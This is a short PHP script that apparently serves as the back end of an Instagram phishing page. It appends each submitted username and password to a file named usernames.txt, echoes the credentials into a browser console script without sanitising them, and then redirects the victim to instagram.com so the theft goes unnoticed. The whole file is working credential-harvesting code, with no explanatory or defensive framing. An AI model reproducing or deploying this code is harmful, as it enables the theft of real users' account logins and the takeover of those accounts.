<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
echo "<script>console.log('Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n' );</script>";
header('Location: https://instagram.com');
exit();
